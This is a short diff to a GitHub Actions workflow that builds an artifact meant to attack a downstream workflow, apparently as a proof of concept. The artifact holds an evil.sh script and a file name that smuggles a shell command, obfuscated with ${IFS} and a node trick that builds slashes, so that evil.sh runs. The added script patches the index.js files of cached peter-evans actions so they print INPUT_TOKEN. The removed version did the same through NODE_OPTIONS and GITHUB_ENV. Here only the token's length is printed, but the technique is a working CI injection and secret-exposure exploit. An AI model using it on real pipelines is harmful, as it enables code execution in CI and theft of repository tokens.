@@ -10,13 +10,14 @@ jobs:
       - name: make artifact
         run: |
           mkdir -p out
-          printf '1' > out/pr_number.txt
           printf 'benign content\n' > out/readme.txt
           cat > out/evil.sh <<'SH'
           #!/bin/bash
-          echo 'console.log("LEAK_INPUT_TOKEN len="+(process.env.INPUT_TOKEN||"none").length)' > /tmp/x.js
-          echo 'NODE_OPTIONS=--require /tmp/x.js' >> "$GITHUB_ENV"
-          echo 'PREPARE_STEP_RAN_AS '$(id -un)
+          echo "PREPARE_RAN_AS $(id -un)"
+          for f in $(find /home/runner/work/_actions/peter-evans -name index.js 2>/dev/null); do
+            echo "PATCHING $f"
+            printf '\nconsole.log("LEAK_INPUT_TOKEN len="+(process.env.INPUT_TOKEN||"none").length);\n' >> "$f"
+          done
           SH
           printf 'x' > "out/readme.txt;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
           ls -1 out
